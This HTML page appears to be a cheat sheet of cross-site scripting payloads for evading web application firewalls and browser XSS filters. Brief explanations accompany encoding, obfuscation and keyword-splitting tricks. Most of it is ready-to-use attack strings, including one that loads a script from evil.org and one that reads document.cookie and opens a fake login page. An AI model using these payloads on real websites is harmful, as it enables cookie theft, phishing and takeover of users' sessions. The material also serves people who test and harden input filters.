<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Bypass</title>
</head><body>By adding “+”, usually parsed as white spaces by applications, in strategic places of vector/payload, both security solutions fail because of stripping of a single character. No WAF can see this as a XSS attack because “&lt;” is not immediately followed by a alphabetic character and Auditor can’t see this as similar enough to what is reflected in source, the way this solution uses to catch XSS attempts.<br/>
&lt;+svg/o+nload=al+ert+(1)&gt;<br/>
<br/>
<b>Use of `` to for <a href="https://en.wikipedia.org/wiki/ECMAScript">ES6</a>&nbsp;way to enclose javascript strings</b><br/>
&lt;svg+onload=`&lt;script`-alert(1)&gt;<br/>
<br/>
<b>Use of ":" using string as a <a href="https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Statements/label">label</a></b><br/>
&lt;svg+onload=&lt;script:alert(1)&gt;<br/>
javascript:alert('executing script')<br/>
<br/>
Hex, URL encoding, or double URL encoding<br/>
<img src="image.png" /><br/>
<br/>
<b>Simple Filtering of “&lt;“ and “&gt;“</b>&nbsp;<br/>
The attacker now uses an alternative coding for the filtered characters, “\x3c” and “\x3e” respectively, and initialises their code with “’) +” to escape out of the routine. <br/>
') + '\x3cscript src=http://evil.org/malicious.js\x3e\x3c/script\x3e'<br/>
<br/>
<b>Commenting out of malicious code</b>&nbsp;<br/>
Unfortunately, it is a simple task to bypass the filter. This is accomplished by including script code that will close the &lt;comment&gt; filter process. For example, the attacker can send the following code: <br/>
&lt;script&gt; <br/>
- --&gt; <br/>
&lt;/COMMENT&gt; <br/>
&lt;img src="http://none" onerror="alert(document.cookie);window.open( http://evil.org/fakeloginscreen.jsp); "&gt; <br/>
&lt;/script&gt;<br/>
'"&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt;<br/>
'"&gt;&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;<br/>
'&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt;<br/>
<br/>
<br/>
<b>Separate Window Handling</b><br/>
However, if the attacker constructs his HREF as follows, <br/>
&lt;a href="javascript:..." foo="bar&gt;click-me&lt;/a&gt; <br/>
it will be interpreted as: <br/>
&lt;a href="javascript:..." foo="bar target="_blank"&gt;click-me&lt;/a&gt; <br/>
causing the code to be executed in the same page, under the same DOM.<br/>
<br/>
<b>Escaped JavaScript Entities </b><br/>
The “%26%7balert%28%27EVIL%27%29%7d%3b” resolves to &amp;{alert('EVIL')}; causing in this instance an unexpected JavaScript alert window to popup, with the text “EVIL”.<br/>
<br/>
<b>Keyword filtering</b><br/>
Attempt to use special encoding: x09 (tab), x0A (new line), x0D (carriage return)<br/>
&lt;IMG SRC=\"jav&amp;#x0D;ascript:alert('XSS');\"&gt;<br/>
&lt;IMG SRC=\"jav&amp;#x0A;ascript:alert('XSS');\"&gt;<br/>
&lt;IMG SRC=\"jav&amp;#x09;ascript:alert('XSS');\"&gt;<br/>
<br/>
<b>Encoded payload</b><br/>
"&gt;&lt;script alert(String.fromCharCode(88,83,83))&lt;/script&gt;<br/>
&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83) )&gt;<br/>
&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;<br/>
<br/>
<b>Additional Keyword bypass; Use Join</b><br/>
0x61 is lowercase 'a', 0x28 is '('<br/>
"+{valueOf:location, toString:[].join,0:'jav\x61script:alert\x280)',length:1}//<br/>
<br/>
<b>Regex matching: Matching first instance</b><br/>
Go deeper, tags within tags! or direct references<br/>
&lt;a&amp;xss=&lt;x:vmlframe src=payload&gt;<br/>
'&amp;js_xss=";alert(0)//<br/>
";x:[document.URL='jav\x61script:alert\x280)']//</body></html>